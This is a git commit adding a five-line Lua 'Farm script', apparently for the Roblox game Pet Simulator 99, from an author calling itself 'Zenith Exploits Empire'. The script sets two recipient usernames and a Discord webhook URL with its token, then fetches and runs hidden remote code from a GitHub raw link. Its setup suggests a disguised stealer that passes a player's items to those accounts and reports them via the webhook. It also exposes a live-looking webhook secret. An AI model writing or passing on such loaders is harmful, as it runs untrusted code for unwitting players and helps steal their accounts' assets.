995267a4c9d4c35e242c92cd1cdaf16b039b39a3
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-22 14:53:53 +0200

    Added ps99 script: Farm script

---
+++ ps99/Farm script.lua
@@ -0,0 +1,5 @@
+Username = "Eliasmirt"
+Username2 = "Eliasmirt"
+Webhook = "https://discord.com/api/webhooks/1314313369733435392/vIJuYIS53VGyZUDmybS30l6b150XGEY0SZklhOVy-bieI71X284NBWUMjVItzIKS0-wY"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
